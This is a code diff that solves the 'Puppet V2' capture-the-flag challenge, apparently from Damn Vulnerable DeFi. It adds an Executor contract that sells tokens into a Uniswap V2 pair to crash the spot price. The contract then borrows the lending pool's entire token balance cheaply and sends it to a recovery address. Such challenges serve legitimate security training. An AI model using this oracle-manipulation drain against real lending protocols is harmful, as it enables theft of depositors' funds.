@@ -10,6 +10,73 @@ import {WETH} from "solmate/tokens/WETH.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";
 
+contract Executor {
+    PuppetV2Pool lendingPool;
+    IUniswapV2Router02 uniswapV2Router;
+    DamnValuableToken token;
+    WETH weth;
+    address player;
+    address recovery;
+
+    constructor(
+        address _lendingPool,
+        address _uniswapV2Router,
+        address _token,
+        address payable _weth,
+        address _player,
+        address _recovery
+    ) {
+        lendingPool = PuppetV2Pool(_lendingPool);
+        uniswapV2Router = IUniswapV2Router02(_uniswapV2Router);
+        token = DamnValuableToken(_token);
+        weth = WETH(_weth);
+        player = _player;
+        recovery = _recovery;
+    }
+
+    function execute() public payable {
+        // Pull all tokens from player
+        uint256 playerTokenBalance = token.balanceOf(player);
+        token.transferFrom(player, address(this), playerTokenBalance);
+
+        // deposit eth and receive weth
+        weth.deposit{value: msg.value}();
+
+        // Sell tokens for weth, lowering the price of the token
+        token.approve(address(uniswapV2Router), playerTokenBalance);
+
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+
+        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens({
+            amountIn: playerTokenBalance,
+            amountOutMin: 1,
+            path: path,
+            deadline: block.timestamp + 1,
+            to: address(this)
+        });
+
+        uint256 poolTokenBalance = token.balanceOf(address(lendingPool));
+        uint256 depositAmountRequired = lendingPool.calculateDepositOfWETHRequired(poolTokenBalance);
+
+        require(weth.balanceOf(address(this)) >= depositAmountRequired, "Not enough WETH to deposit");
+
+        // Pull all the tokens from the lending pool
+        // Because the price of the token has been lowered, the deposit required is now lower
+        weth.approve(address(lendingPool), depositAmountRequired);
+        lendingPool.borrow(poolTokenBalance);
+
+        uint256 poolTokensBalanceAfter = token.balanceOf(address(lendingPool));
+
+        // transfer all the tokens to the recovery address
+        token.transfer(recovery, token.balanceOf(address(this)));
+    }
+
+    receive() external payable {}
+}
+
+
 contract PuppetV2Challenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -98,7 +165,16 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
-        
+        Executor executor = new Executor(
+            address(lendingPool),
+            address(uniswapV2Router),
+            address(token),
+            payable(weth),
+            player,
+            recovery
+        );
+        token.approve(address(executor), PLAYER_INITIAL_TOKEN_BALANCE);
+        executor.execute{value: PLAYER_INITIAL_ETH_BALANCE}();
     }
 
     /**
